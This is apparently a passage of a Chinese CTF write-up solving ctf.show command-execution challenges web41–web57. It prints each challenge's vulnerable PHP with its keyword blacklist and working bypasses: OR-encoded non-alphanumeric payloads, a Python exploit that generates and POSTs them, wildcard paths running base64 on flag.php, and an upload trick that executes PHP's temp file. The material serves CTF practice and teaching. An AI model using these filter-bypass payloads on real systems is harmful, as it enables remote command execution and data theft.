<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">payload1 ?c&#x3D;((&#39;%40&#39;|&#39;%10&#39;).(&#39;%40&#39;|&#39;%08&#39;).(&#39;%40&#39;|&#39;%10&#39;).(&#39;%40&#39;|&#39;%09&#39;).(&#39;%40&#39;|&#39;%0e&#39;).(&#39;%40&#39;|&#39;%06&#39;).(&#39;%40&#39;|&#39;%0F&#39;))()</span><br><span class="line"></span><br><span class="line">payload2 ?c&#x3D;((&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;))()</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717110940082.png" alt="image-20210717110940082"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717144624204.png" alt="image-20210717144624204"></p>
</li>
<li><p>沿用羽师傅的代码</p>
</li>
<li><p><strong>解释一下：先是ascill码256个字符的所对应的16进制数，然后利用preg_match排除他们本身的二进制字符串是属于被过滤范围内的，可以大量减少运行时间，然后再读入到rce_or.txt中，利用python写exp进行利用。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: GuYing</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021/7/17</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//异或</span></span><br><span class="line">$myfile = fopen(<span class="string">"rce_or.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line">$contents = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123; </span><br><span class="line">	<span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt; <span class="number">256</span> ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($i&lt;<span class="number">16</span>) &#123;</span><br><span class="line">			$hex_i=<span class="string">'0'</span>.dechex($i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$hex_i=dechex($i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			$hex_j=<span class="string">'0'</span>.dechex($j);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$hex_j = dechex($j);</span><br><span class="line">		&#125;</span><br><span class="line">		$preg = <span class="string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span>;</span><br><span class="line">		<span class="keyword">if</span>(preg_match($preg, hex2bin($hex_i))||preg_match($preg, hex2bin($hex_j)))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">''</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$a = <span class="string">'%'</span>.$hex_i;</span><br><span class="line">			$b = <span class="string">'%'</span>.$hex_j;</span><br><span class="line">			$c = (urldecode($a) | urldecode($b));</span><br><span class="line">			<span class="keyword">if</span> (ord($c)&gt;=<span class="number">32</span>&amp;ord($c)&lt;=<span class="number">126</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				$contents=$contents.$c.<span class="string">" "</span>.$a.<span class="string">" "</span>.$b.<span class="string">"\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile, $contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>python跑一下脚本</strong></p>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">"php rce_or.php"</span>)  <span class="comment"># 执行shell语句</span></span><br><span class="line"><span class="keyword">if</span> (len(argv) != <span class="number">2</span>):</span><br><span class="line">    print(len(argv))</span><br><span class="line">    print(argv)</span><br><span class="line">    print(argv[<span class="number">0</span>:<span class="number">2</span>])</span><br><span class="line">    print(<span class="string">"="</span> * <span class="number">50</span>)</span><br><span class="line">    print(<span class="string">'USER：python exp.py &lt;url&gt;'</span>)</span><br><span class="line">    print(<span class="string">"eg：  python exp.py http://ctf.show/"</span>)</span><br><span class="line">    print(<span class="string">"="</span> * <span class="number">50</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(arg)</span>:</span></span><br><span class="line">    s1 = <span class="string">""</span></span><br><span class="line">    s2 = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = open(<span class="string">"rce_or.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">""</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">"(\""</span> + s1 +<span class="string">"\"|\""</span> + s2 + <span class="string">"\")"</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(input(<span class="string">"Your function :  "</span>)) + action(input(<span class="string">"Your command:  "</span>))</span><br><span class="line">    print(<span class="string">"Your payload: "</span>+param);</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'c'</span>: urllib.parse.unquote(param)</span><br><span class="line">    &#125;</span><br><span class="line">    print(data)</span><br><span class="line">    r = requests.post(url , data=data)</span><br><span class="line">    print(<span class="string">"result: "</span>+r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717150405707.png" alt="image-20210717150405707"></p>
</blockquote>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717151636427.png" alt=""></p>
</blockquote>
<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717152049686.png" alt="image-20210717152049686"></p>
</blockquote>
<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/;|cat|flag/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717152655692.png" alt="image-20210717152655692"></p>
</blockquote>
<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| /i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717153219160.png" alt="image-20210717153219160"></p>
</blockquote>
<h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717183425122.png" alt="image-20210717183425122"></p>
</blockquote>
<h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717183713606.png" alt="image-20210717183713606"></p>
</blockquote>
<h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717183954397.png" alt="image-20210717183954397"></p>
</blockquote>
<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717184223954.png" alt="image-20210717184223954"></p>
</blockquote>
<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717190209066.png" alt="image-20210717190209066"></p>
</blockquote>
<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717190620917.png" alt="image-20210717190620917"></p>
</blockquote>
<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<ul>
<li><p>看一下目录</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717194039748.png" alt="image-20210717194039748"></p>
</li>
<li><p><strong>直接看看a.txt是啥</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717194149794.png" alt="image-20210717194149794"></p>
</li>
<li><p><strong>发现有个flag文件在根目录</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717194258088.png" alt="image-20210717194258088"></p>
</li>
<li><p><strong>用nl或者ta’’c看看’’是用来过滤</strong></p>
</li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717193603100.png" alt="image-20210717193603100"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717194411798.png" alt="image-20210717194411798"></p>
</blockquote>
<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$d;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'no'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717195320225.png" alt="image-20210717195320225"></p>
</blockquote>
<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717200118282.png" alt="image-20210717200118282"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717200132124.png" alt="w"></p>
</blockquote>
<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>bin为binary的简写，主要放置一些系统必备的执行命令，里面有base64可以试试绕过</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;&#x2F;???&#x2F;????64 ????.???  相当于 ?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210718092438468.png" alt="image-20210718092438468"></p>
</blockquote>
<ul>
<li>解密之后就是结果</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210718092518736.png" alt="image-20210718092518736"></p>
</blockquote>
<ul>
<li>毕竟不是万能的，所以看了一下经典的p师傅上传命令执行，写一个upload.php简单的上传功能，然后利用. 来执行shell语句，<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">建议看看无字母数字webshell命令执行</a>了解一下原理</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://9690d3da-43c1-4f75-87b3-628eff4078df.challenge.ctf.show:8080/"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>因为php的上传文件之后，服务端并没有直接丢弃上传的文件，而是放在了/tmp/????????? 这里有九位数字可以为/tmp/phpabcabD因为正常情况最后一位都会是大写字母，利用[@-[]来确定执行范围所以构造payload（@-[是大写字母的范围可以去查ascii码）好像构造的时候.后面得加个空格或者+号也行</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;.+&#x2F;???&#x2F;????????[@-[]</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>上传抓包</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210718100015465.png" alt="image-20210718100015465"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210718100055211.png" alt="image-20210718100055211"></p>
<blockquote>
<ul>
<li>经此可以发现写个python代码直接上传文件，就写入cat flag.php 不用加#!bin/sh</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">"http://9690d3da-43c1-4f75-87b3-628eff4078df.challenge.ctf.show:8080/?c=.+/???/????????[@-[]"</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">"file"</span>: (<span class="string">'1.txt'</span>, <span class="string">'cat flag.php'</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">"flag"</span>):</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210718100242475.png" alt="image-20210718100242475"></p>
<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><blockquote>
<ul>
<li><strong>过滤的数字，但是还是不影响第二种命令执行的方法，延续上题，或者python代码跑一波</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210718100624413.png" alt="image-20210718100624413"></p>
<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;flag in 36.php</span><br><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c&#x3D;$_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;\;|[a-z]|[0-9]|\&#96;|\|\#|\&#39;|\&quot;|\&#96;|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\&#x3D;|\[&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        system(&quot;cat &quot;.$c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>flag在36.php，我们构造一个36就行了</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$(())------是-1</span><br><span class="line">$((~37))------是36</span><br><span class="line">所以我们只需要保证中间是-37即可，</span><br></pre></td></tr></table></figure></div>

<p><strong>在linux中，<code>$(())</code>是数学计算符，空值的时候为0，对0进行取反就是-1，构造37个-1相加，然后得-37取反为36，写一个脚本</strong></p>
